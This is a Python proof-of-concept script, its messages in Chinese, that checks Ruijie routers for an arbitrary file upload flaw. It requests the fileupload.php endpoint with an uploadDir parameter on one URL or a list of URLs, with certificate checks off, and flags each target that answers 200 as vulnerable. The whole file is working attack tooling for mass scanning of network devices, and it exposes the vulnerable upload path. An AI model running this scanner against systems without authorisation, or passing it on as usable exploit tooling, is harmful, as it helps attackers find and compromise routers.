import requests
import urllib3
import json
import argparse
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gateway; supportMoreLan=no"
}

def title():
    print("* " * 20)
    print("[+]漏洞名称：锐捷路由器任意文件上传")
    print("[+]漏洞编号：暂无")
    print("[+]poc作者：维维豆奶-dave")
    print("* " * 20)
    print("\n\n")

def poc(url):
    if url.endswith("/"):
        path = "ddi/server/fileupload.php?uploadDir=111"
    else:
        path = "/ddi/server/fileupload.php?uploadDir=111"
    pocurl = url + path
    try:
        res = requests.get(url=pocurl,headers=head,verify=False,timeout=2)
        if res.status_code == 200:
            print(Fore.GREEN + f"[+]{url}存在任意文件上传！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在任意文件上传漏洞")
    except:
        print(f"{url}连接失败")

if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(usage='python3 ruijiepoc.py -u http://xxxx\npython3 ruijiepoc.py -f file.txt',
                                     description='ruijie漏洞利用exp',
                                     )
    p = parser.add_argument_group('ivms 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if not args.url and not args.file:
        print("请输入 -u 参数指定 URL 地址：python3 exp.py -u url")
        parser.print_help()
        exit()
    if args.url:
        poc(args.url)
    if args.file:
        for i in open(args.file, "r").read().split("\n"):
            poc(i)